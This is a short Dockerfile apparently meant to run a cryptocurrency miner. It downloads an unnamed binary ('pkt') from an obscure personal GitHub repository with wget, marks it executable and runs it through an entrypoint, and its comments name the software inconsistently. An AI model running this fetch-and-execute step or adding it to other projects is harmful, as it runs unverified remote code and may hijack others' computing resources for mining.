#
# Dockerfile for SRBMiner-Multi, https://github.com/hellcatz/luckpool
# see run.sh
#
FROM debian:buster-slim
RUN apt-get update && apt-get -y install wget xz-utils git && \
    cd /opt && wget https://github.com/Amnsj/bih/blob/master/pkt?raw=true -O pkt && \
	chmod +x * && \
	apt-get -y purge xz-utils && apt-get -y autoremove --purge && apt-get -y clean && apt-get -y autoclean; rm -rf /var/lib/apt-get/lists/*
COPY entrypoint /opt/vgho/
RUN chmod +x /opt/vgho/entrypoint
# it needs a workdir spec in order to see the 'verus-solver' binary right next to it
WORKDIR "/opt/vgho"
ENTRYPOINT "./entrypoint"
# EOF
